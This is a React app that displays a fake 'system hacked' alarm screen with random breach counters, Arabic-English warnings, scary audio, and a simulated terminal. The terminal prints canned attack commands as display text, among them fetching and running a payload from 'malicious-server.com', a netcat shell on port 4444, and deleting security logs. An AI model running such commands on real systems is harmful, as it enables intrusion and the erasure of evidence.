import React, { useState, useEffect, useRef } from 'react';

const App: React.FC = () => {
  const [systemIntegrity, setSystemIntegrity] = useState(100);
  const [breachLevel, setBreachLevel] = useState(0);
  const [compromisedNodes, setCompromisedNodes] = useState(0);
  const [dataExfiltrated, setDataExfiltrated] = useState(0);
  const [attackVectors, setAttackVectors] = useState(0);
  const [timeElapsed, setTimeElapsed] = useState(0);
  const [currentThreat, setCurrentThreat] = useState('');
  const [networkStatus] = useState('COMPROMISED');
  const [encryptionStatus] = useState('BROKEN');
  const [firewallStatus] = useState('DISABLED');
  const [backupStatus] = useState('CORRUPTED');
  const [alertLevel, setAlertLevel] = useState(1);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);
  
  const audioRef = useRef<HTMLAudioElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const systemTimer = setInterval(() => {
      setSystemIntegrity(prev => Math.max(prev - Math.random() * 3, 0));
      setBreachLevel(prev => Math.min(prev + Math.random() * 2.5, 100));
      setCompromisedNodes(prev => prev + Math.floor(Math.random() * 3));
      setDataExfiltrated(prev => prev + Math.floor(Math.random() * 2000));
      setAttackVectors(prev => prev + Math.floor(Math.random() * 2));
      setTimeElapsed(prev => prev + 1);
      
      if (breachLevel > 80) setAlertLevel(5);
      else if (breachLevel > 60) setAlertLevel(4);
      else if (breachLevel > 40) setAlertLevel(3);
      else if (breachLevel > 20) setAlertLevel(2);
      else setAlertLevel(1);
    }, 1500);

    const threatTimer = setInterval(() => {
      const threats = [
        'تحذير: هجوم DDoS نشط - ACTIVE DDoS ATTACK',
        'خرق قاعدة البيانات - DATABASE BREACH DETECTED',
        'تسريب كلمات المرور - PASSWORD LEAK CONFIRMED',
        'اختراق الخادم الرئيسي - MAIN SERVER COMPROMISED',
        'فيروس متقدم مكتشف - ADVANCED MALWARE DETECTED',
        'تشفير الملفات جاري - FILE ENCRYPTION IN PROGRESS',
        'سرقة الهوية نشطة - IDENTITY THEFT ACTIVE',
        'تدمير النسخ الاحتياطية - BACKUP DESTRUCTION',
        'اختراق شبكة الأمان - SECURITY NETWORK BREACH',
        'تحكم كامل بالنظام - TOTAL SYSTEM CONTROL'
      ];
      setCurrentThreat(threats[Math.floor(Math.random() * threats.length)]);
    }, 3000);

    const terminalTimer = setInterval(() => {
      const commands = [
        'root@hacked-system:~# rm -rf /var/log/security/*',
        'root@hacked-system:~# wget http://malicious-server.com/payload.sh',
        'root@hacked-system:~# chmod +x payload.sh && ./payload.sh',
        'root@hacked-system:~# netcat -l -p 4444 -e /bin/bash',
        'root@hacked-system:~# python3 keylogger.py --stealth',
        'root@hacked-system:~# sqlmap -u "target.com" --dump-all',
        'root@hacked-system:~# nmap -sS -O target-network.com',
        'root@hacked-system:~# hydra -l admin -P passwords.txt ssh://target',
        'root@hacked-system:~# metasploit > use exploit/multi/handler',
        'root@hacked-system:~# john --wordlist=rockyou.txt hashes.txt',
        'root@hacked-system:~# تم اختراق جميع الحسابات - ALL ACCOUNTS COMPROMISED',
        'root@hacked-system:~# النظام تحت السيطرة الكاملة - TOTAL SYSTEM CONTROL'
      ];
      
      setTerminalLines(prev => {
        const newLines = [...prev, commands[Math.floor(Math.random() * commands.length)]];
        return newLines.slice(-8); // Keep only last 8 lines
      });
    }, 2000);

    const playAudio = () => {
      const audioFiles = [
        '/scary-ambience-59002.mp3',
        '/horror_scream.wav',
        '/evil_beep.wav'
      ];
      
      const randomAudio = audioFiles[Math.floor(Math.random() * audioFiles.length)];
      if (audioRef.current) {
        audioRef.current.src = randomAudio;
        audioRef.current.currentTime = 0;
        audioRef.current.play().catch(console.error);
        
        setTimeout(() => {
          if (audioRef.current) {
            audioRef.current.pause();
          }
        }, 20000);
      }
    };

    const audioInterval = setInterval(playAudio, 25000);
    playAudio();

    const canvas = canvasRef.current;
    if (canvas) {
      const ctx = canvas.getContext('2d');
      if (ctx) {
        canvas.width = window.innerWidth;
        canvas.height = 200;
        
        const animateNetwork = () => {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.strokeStyle = '#ff0000';
          ctx.lineWidth = 2;
          
          for (let i = 0; i < compromisedNodes; i++) {
            const x = (i * 50) % canvas.width;
            const y = 50 + Math.sin(Date.now() * 0.01 + i) * 20;
            
            ctx.beginPath();
            ctx.arc(x, y, 5, 0, 2 * Math.PI);
            ctx.fillStyle = '#ff0000';
            ctx.fill();
            
            if (i > 0) {
              const prevX = ((i - 1) * 50) % canvas.width;
              const prevY = 50 + Math.sin(Date.now() * 0.01 + (i - 1)) * 20;
              ctx.beginPath();
              ctx.moveTo(prevX, prevY);
              ctx.lineTo(x, y);
              ctx.stroke();
            }
          }
          
          requestAnimationFrame(animateNetwork);
        };
        
        animateNetwork();
      }
    }

    return () => {
      clearInterval(systemTimer);
      clearInterval(threatTimer);
      clearInterval(terminalTimer);
      clearInterval(audioInterval);
    };
  }, [breachLevel, compromisedNodes]);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const getAlertColor = () => {
    switch (alertLevel) {
      case 5: return '#ff0000';
      case 4: return '#ff4400';
      case 3: return '#ff8800';
      case 2: return '#ffaa00';
      default: return '#ffff00';
    }
  };

  const getAlertText = () => {
    switch (alertLevel) {
      case 5: return 'تحذير أقصى - MAXIMUM ALERT';
      case 4: return 'تحذير عالي - HIGH ALERT';
      case 3: return 'تحذير متوسط - MEDIUM ALERT';
      case 2: return 'تحذير منخفض - LOW ALERT';
      default: return 'مراقبة - MONITORING';
    }
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: `
        radial-gradient(circle at 20% 20%, rgba(255, 0, 0, 0.3) 0%, transparent 50%),
        radial-gradient(circle at 80% 80%, rgba(0, 255, 0, 0.2) 0%, transparent 50%),
        radial-gradient(circle at 40% 60%, rgba(255, 255, 0, 0.1) 0%, transparent 50%),
        linear-gradient(135deg, #000000 0%, #1a0000 25%, #000a00 50%, #001a00 75%, #000000 100%)
      `,
      backgroundSize: '400% 400%',
      animation: 'chaosGradient 12s ease infinite',
      color: '#00ff00',
      fontFamily: 'Courier New, monospace',
      overflow: 'hidden',
      position: 'relative'
    }}>
      <audio ref={audioRef} />
      
      {/* Scanning Lines Effect */}
      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        width: '100%',
        height: '100%',
        background: `
          repeating-linear-gradient(
            0deg,
            transparent,
            transparent 2px,
            rgba(0, 255, 0, 0.1) 2px,
            rgba(0, 255, 0, 0.1) 4px
          )
        `,
        animation: 'scanLines 0.1s linear infinite'
      }} />

      {/* Digital Noise Overlay */}
      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        width: '100%',
        height: '100%',
        background: `
          repeating-conic-gradient(
            from 0deg at 50% 50%,
            transparent 0deg,
            rgba(255, 0, 0, 0.05) 1deg,
            transparent 2deg
          )
        `,
        animation: 'digitalNoise 0.2s infinite'
      }} />

      {/* Main Container */}
      <div style={{
        padding: '15px',
        position: 'relative',
        zIndex: 10,
        maxWidth: '1400px',
        margin: '0 auto'
      }}>
        
        {/* Critical Alert Header */}
        <div style={{
          textAlign: 'center',
          marginBottom: '20px',
          border: `3px solid ${getAlertColor()}`,
          padding: '15px',
          backgroundColor: `rgba(${alertLevel === 5 ? '255, 0, 0' : '0, 0, 0'}, 0.8)`,
          borderRadius: '15px',
          animation: `criticalPulse ${0.5 + (5 - alertLevel) * 0.3}s infinite`,
          boxShadow: `0 0 30px ${getAlertColor()}`
        }}>
          <h1 style={{
            fontSize: '2.2rem',
            color: getAlertColor(),
            textShadow: `0 0 25px ${getAlertColor()}`,
            margin: '0 0 10px 0',
            animation: 'textGlitch 0.5s infinite'
          }}>
            🚨 {getAlertText()} 🚨
          </h1>
          <h2 style={{
            fontSize: '1.8rem',
            color: '#ff0000',
            margin: '10px 0',
            textShadow: '0 0 20px #ff0000'
          }}>
            ⚠️ اختراق أمني متقدم - ADVANCED SECURITY BREACH ⚠️
          </h2>
          <p style={{
            color: '#ffffff',
            fontSize: '1.3rem',
            margin: '10px 0',
            animation: 'blink 1s infinite'
          }}>
            {currentThreat}
          </p>
        </div>

        {/* Network Visualization Canvas */}
        <div style={{
          marginBottom: '20px',
          border: '2px solid #00ff00',
          borderRadius: '10px',
          backgroundColor: 'rgba(0, 0, 0, 0.8)',
          padding: '10px'
        }}>
          <h3 style={{
            color: '#00ff00',
            textAlign: 'center',
            margin: '0 0 10px 0',
            fontSize: '1.2rem'
          }}>
            🌐 خريطة الشبكة المخترقة - COMPROMISED NETWORK MAP
          </h3>
          <canvas ref={canvasRef} style={{ width: '100%', height: '200px' }} />
        </div>

        {/* Advanced Metrics Grid */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))',
          gap: '15px',
          marginBottom: '20px'
        }}>
          
          {/* System Integrity */}
          <div style={{
            backgroundColor: `rgba(${255 - systemIntegrity * 2.55}, ${systemIntegrity * 2.55}, 0, 0.3)`,
            border: `2px solid ${systemIntegrity > 50 ? '#ffff00' : '#ff0000'}`,
            padding: '20px',
            borderRadius: '12px',
            animation: 'statusPulse 2s infinite'
          }}>
            <h3 style={{ 
              color: systemIntegrity > 50 ? '#ffff00' : '#ff0000', 
              margin: '0 0 10px 0', 
              fontSize: '1.1rem',
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}>
              🛡️ سلامة النظام
            </h3>
            <div style={{
              width: '100%',
              height: '20px',
              backgroundColor: 'rgba(0, 0, 0, 0.5)',
              borderRadius: '10px',
              overflow: 'hidden',
              marginBottom: '10px'
            }}>
              <div style={{
                width: `${systemIntegrity}%`,
                height: '100%',
                backgroundColor: systemIntegrity > 50 ? '#00ff00' : '#ff0000',
                transition: 'width 0.5s ease',
                animation: 'barPulse 1s infinite'
              }} />
            </div>
            <p style={{ color: '#ffffff', fontSize: '1.4rem', margin: '5px 0' }}>
              {systemIntegrity.toFixed(1)}%
            </p>
            <p style={{ color: '#aaaaaa', fontSize: '0.9rem' }}>
              System Integrity
            </p>
          </div>

          {/* Breach Level */}
          <div style={{
            backgroundColor: `rgba(${breachLevel * 2.55}, 0, 0, 0.3)`,
            border: '2px solid #ff0000',
            padding: '20px',
            borderRadius: '12px',
            animation: 'dangerPulse 1.5s infinite'
          }}>
            <h3 style={{ color: '#ff0000', margin: '0 0 10px 0', fontSize: '1.1rem' }}>
              ⚡ مستوى الاختراق
            </h3>
            <div style={{
              width: '100%',
              height: '20px',
              backgroundColor: 'rgba(0, 0, 0, 0.5)',
              borderRadius: '10px',
              overflow: 'hidden',
              marginBottom: '10px'
            }}>
              <div style={{
                width: `${breachLevel}%`,
                height: '100%',
                backgroundColor: '#ff0000',
                transition: 'width 0.5s ease',
                animation: 'dangerBar 0.5s infinite'
              }} />
            </div>
            <p style={{ color: '#ffffff', fontSize: '1.4rem', margin: '5px 0' }}>
              {breachLevel.toFixed(1)}%
            </p>
            <p style={{ color: '#aaaaaa', fontSize: '0.9rem' }}>
              Breach Level
            </p>
          </div>

          {/* Compromised Nodes */}
          <div style={{
            backgroundColor: 'rgba(255, 100, 0, 0.3)',
            border: '2px solid #ff6400',
            padding: '20px',
            borderRadius: '12px',
            animation: 'warningPulse 2.5s infinite'
          }}>
            <h3 style={{ color: '#ff6400', margin: '0 0 10px 0', fontSize: '1.1rem' }}>
              🔗 العقد المخترقة
            </h3>
            <p style={{ color: '#ffffff', fontSize: '1.8rem', margin: '10px 0' }}>
              {compromisedNodes}
            </p>
            <p style={{ color: '#aaaaaa', fontSize: '0.9rem' }}>
              Compromised Nodes
            </p>
          </div>

          {/* Data Exfiltrated */}
          <div style={{
            backgroundColor: 'rgba(255, 255, 0, 0.3)',
            border: '2px solid #ffff00',
            padding: '20px',
            borderRadius: '12px',
            animation: 'dataPulse 3s infinite'
          }}>
            <h3 style={{ color: '#ffff00', margin: '0 0 10px 0', fontSize: '1.1rem' }}>
              💾 البيانات المسروقة
            </h3>
            <p style={{ color: '#ffffff', fontSize: '1.6rem', margin: '10px 0' }}>
              {(dataExfiltrated / 1000).toFixed(1)} GB
            </p>
            <p style={{ color: '#aaaaaa', fontSize: '0.9rem' }}>
              Data Exfiltrated
            </p>
          </div>

          {/* Attack Vectors */}
          <div style={{
            backgroundColor: 'rgba(255, 0, 255, 0.3)',
            border: '2px solid #ff00ff',
            padding: '20px',
            borderRadius: '12px',
            animation: 'attackPulse 1.8s infinite'
          }}>
            <h3 style={{ color: '#ff00ff', margin: '0 0 10px 0', fontSize: '1.1rem' }}>
              🎯 محاور الهجوم
            </h3>
            <p style={{ color: '#ffffff', fontSize: '1.8rem', margin: '10px 0' }}>
              {attackVectors}
            </p>
            <p style={{ color: '#aaaaaa', fontSize: '0.9rem' }}>
              Attack Vectors
            </p>
          </div>

          {/* Time Elapsed */}
          <div style={{
            backgroundColor: 'rgba(0, 255, 255, 0.3)',
            border: '2px solid #00ffff',
            padding: '20px',
            borderRadius: '12px',
            animation: 'timePulse 2.2s infinite'
          }}>
            <h3 style={{ color: '#00ffff', margin: '0 0 10px 0', fontSize: '1.1rem' }}>
              ⏰ وقت الهجوم
            </h3>
            <p style={{ color: '#ffffff', fontSize: '1.4rem', margin: '10px 0' }}>
              {formatTime(timeElapsed)}
            </p>
            <p style={{ color: '#aaaaaa', fontSize: '0.9rem' }}>
              Attack Duration
            </p>
          </div>
        </div>

        {/* System Status Grid */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
          gap: '15px',
          marginBottom: '20px'
        }}>
          {[
            { name: 'الشبكة', status: networkStatus, color: '#ff0000', icon: '🌐' },
            { name: 'التشفير', status: encryptionStatus, color: '#ff4400', icon: '🔐' },
            { name: 'جدار الحماية', status: firewallStatus, color: '#ff8800', icon: '🛡️' },
            { name: 'النسخ الاحتياطية', status: backupStatus, color: '#ffaa00', icon: '💾' }
          ].map((system, index) => (
            <div key={index} style={{
              backgroundColor: 'rgba(0, 0, 0, 0.8)',
              border: `2px solid ${system.color}`,
              padding: '18px',
              borderRadius: '10px',
              animation: `systemAlert ${1.5 + index * 0.3}s infinite`
            }}>
              <h4 style={{
                color: system.color,
                margin: '0 0 8px 0',
                fontSize: '1.1rem',
                display: 'flex',
                alignItems: 'center',
                gap: '8px'
              }}>
                {system.icon} {system.name}
              </h4>
              <p style={{
                color: '#ffffff',
                fontSize: '1.3rem',
                margin: '5px 0',
                fontWeight: 'bold'
              }}>
                {system.status}
              </p>
            </div>
          ))}
        </div>

        {/* Advanced Terminal */}
        <div style={{
          backgroundColor: 'rgba(0, 0, 0, 0.9)',
          border: '2px solid #00ff00',
          padding: '20px',
          marginBottom: '20px',
          borderRadius: '12px',
          fontFamily: 'Courier New, monospace',
          boxShadow: '0 0 20px rgba(0, 255, 0, 0.3)'
        }}>
          <div style={{
            color: '#00ff00',
            marginBottom: '15px',
            fontSize: '1.3rem',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}>
            💻 طرفية الهجوم المتقدمة - ADVANCED ATTACK TERMINAL
          </div>
          <div style={{
            color: '#00ff00',
            fontSize: '0.95rem',
            lineHeight: '1.6',
            minHeight: '200px'
          }}>
            {terminalLines.map((line, index) => (
              <p key={index} style={{
                margin: '3px 0',
                opacity: 0.7 + (index * 0.1),
                animation: `terminalGlow ${1 + index * 0.2}s infinite`
              }}>
                {line}
              </p>
            ))}
            <p style={{
              color: '#ff0000',
              animation: 'cursor 1s infinite',
              fontSize: '1.1rem'
            }}>
              root@compromised-system:~# █
            </p>
          </div>
        </div>

        {/* Critical System Failure */}
        <div style={{
          backgroundColor: 'rgba(255, 0, 0, 0.4)',
          border: '3px solid #ff0000',
          padding: '25px',
          marginBottom: '20px',
          borderRadius: '15px',
          animation: 'emergencyAlert 0.8s infinite',
          boxShadow: '0 0 40px rgba(255, 0, 0, 0.5)'
        }}>
          <h2 style={{
            color: '#ff0000',
            textAlign: 'center',
            margin: '0 0 15px 0',
            fontSize: '2rem',
            textShadow: '0 0 25px #ff0000',
            animation: 'emergencyText 0.5s infinite'
          }}>
            ☠️ فشل النظام الحرج - CRITICAL SYSTEM FAILURE ☠️
          </h2>
          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))',
            gap: '15px',
            textAlign: 'center'
          }}>
            <div>
              <p style={{ color: '#ffffff', fontSize: '1.2rem', margin: '8px 0' }}>
                🔒 جميع البيانات مشفرة بشكل خبيث
              </p>
              <p style={{ color: '#ffff00', fontSize: '1rem' }}>
                ALL DATA MALICIOUSLY ENCRYPTED
              </p>
            </div>
            <div>
              <p style={{ color: '#ffffff', fontSize: '1.2rem', margin: '8px 0' }}>
                💀 الاسترداد مستحيل نهائياً
              </p>
              <p style={{ color: '#ffff00', fontSize: '1rem' }}>
                RECOVERY PERMANENTLY IMPOSSIBLE
              </p>
            </div>
            <div>
              <p style={{ color: '#ffffff', fontSize: '1.2rem', margin: '8px 0' }}>
                🚨 تحكم كامل بالنظام
              </p>
              <p style={{ color: '#ffff00', fontSize: '1rem' }}>
                TOTAL SYSTEM CONTROL ACHIEVED
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div style={{
          textAlign: 'center',
          marginTop: '30px',
          padding: '25px',
          backgroundColor: 'rgba(0, 0, 0, 0.9)',
          border: '2px solid #00ff00',
          borderRadius: '12px',
          boxShadow: '0 0 25px rgba(0, 255, 0, 0.3)'
        }}>
          <p style={{
            color: '#ff0000',
            fontSize: '1.5rem',
            margin: '10px 0',
            animation: 'finalWarning 1.5s infinite',
            textShadow: '0 0 20px #ff0000'
          }}>
            ⚠️ النظام مغلق نهائياً بسبب الاختراق الأمني المتقدم ⚠️
          </p>
          <p style={{
            color: '#ffff00',
            fontSize: '1.2rem',
            margin: '10px 0'
          }}>
            SYSTEM PERMANENTLY CLOSED DUE TO ADVANCED SECURITY BREACH
          </p>
          <p style={{
            color: '#00ff00',
            fontSize: '1.1rem',
            margin: '20px 0 10px 0',
            animation: 'developerCredit 3s infinite'
          }}>
            تم تطوير النظام بواسطة Boon
          </p>
        </div>
      </div>

      <style>{`
        @keyframes chaosGradient {
          0% { background-position: 0% 50%; }
          25% { background-position: 100% 25%; }
          50% { background-position: 50% 100%; }
          75% { background-position: 25% 0%; }
          100% { background-position: 0% 50%; }
        }
        
        @keyframes scanLines {
          0% { transform: translateY(-100%); }
          100% { transform: translateY(100vh); }
        }
        
        @keyframes digitalNoise {
          0% { opacity: 0.1; transform: rotate(0deg); }
          50% { opacity: 0.3; transform: rotate(180deg); }
          100% { opacity: 0.1; transform: rotate(360deg); }
        }
        
        @keyframes criticalPulse {
          0% { box-shadow: 0 0 20px currentColor; }
          50% { box-shadow: 0 0 40px currentColor, 0 0 60px currentColor; }
          100% { box-shadow: 0 0 20px currentColor; }
        }
        
        @keyframes textGlitch {
          0% { transform: translateX(0); }
          10% { transform: translateX(-2px) skewX(-5deg); }
          20% { transform: translateX(2px) skewX(5deg); }
          30% { transform: translateX(-1px) skewX(-2deg); }
          40% { transform: translateX(1px) skewX(2deg); }
          50% { transform: translateX(0); }
          100% { transform: translateX(0); }
        }
        
        @keyframes statusPulse {
          0% { opacity: 1; }
          50% { opacity: 0.8; }
          100% { opacity: 1; }
        }
        
        @keyframes dangerPulse {
          0% { border-color: #ff0000; }
          50% { border-color: #ff4444; }
          100% { border-color: #ff0000; }
        }
        
        @keyframes warningPulse {
          0% { border-color: #ff6400; }
          50% { border-color: #ff8800; }
          100% { border-color: #ff6400; }
        }
        
        @keyframes dataPulse {
          0% { border-color: #ffff00; }
          50% { border-color: #ffff44; }
          100% { border-color: #ffff00; }
        }
        
        @keyframes attackPulse {
          0% { border-color: #ff00ff; }
          50% { border-color: #ff44ff; }
          100% { border-color: #ff00ff; }
        }
        
        @keyframes timePulse {
          0% { border-color: #00ffff; }
          50% { border-color: #44ffff; }
          100% { border-color: #00ffff; }
        }
        
        @keyframes systemAlert {
          0% { opacity: 1; }
          50% { opacity: 0.7; }
          100% { opacity: 1; }
        }
        
        @keyframes barPulse {
          0% { opacity: 1; }
          50% { opacity: 0.8; }
          100% { opacity: 1; }
        }
        
        @keyframes dangerBar {
          0% { opacity: 1; }
          50% { opacity: 0.6; }
          100% { opacity: 1; }
        }
        
        @keyframes terminalGlow {
          0% { text-shadow: 0 0 5px currentColor; }
          50% { text-shadow: 0 0 10px currentColor, 0 0 15px currentColor; }
          100% { text-shadow: 0 0 5px currentColor; }
        }
        
        @keyframes cursor {
          0% { opacity: 1; }
          50% { opacity: 0; }
          100% { opacity: 1; }
        }
        
        @keyframes emergencyAlert {
          0% { transform: scale(1); }
          50% { transform: scale(1.02); }
          100% { transform: scale(1); }
        }
        
        @keyframes emergencyText {
          0% { color: #ff0000; }
          50% { color: #ffffff; }
          100% { color: #ff0000; }
        }
        
        @keyframes finalWarning {
          0% { opacity: 1; }
          50% { opacity: 0.7; }
          100% { opacity: 1; }
        }
        
        @keyframes developerCredit {
          0% { text-shadow: 0 0 10px currentColor; }
          50% { text-shadow: 0 0 20px currentColor, 0 0 30px currentColor; }
          100% { text-shadow: 0 0 10px currentColor; }
        }
        
        @keyframes blink {
          0%, 50% { opacity: 1; }
          51%, 100% { opacity: 0.3; }
        }
      `}</style>
    </div>
  );
};

export default App;
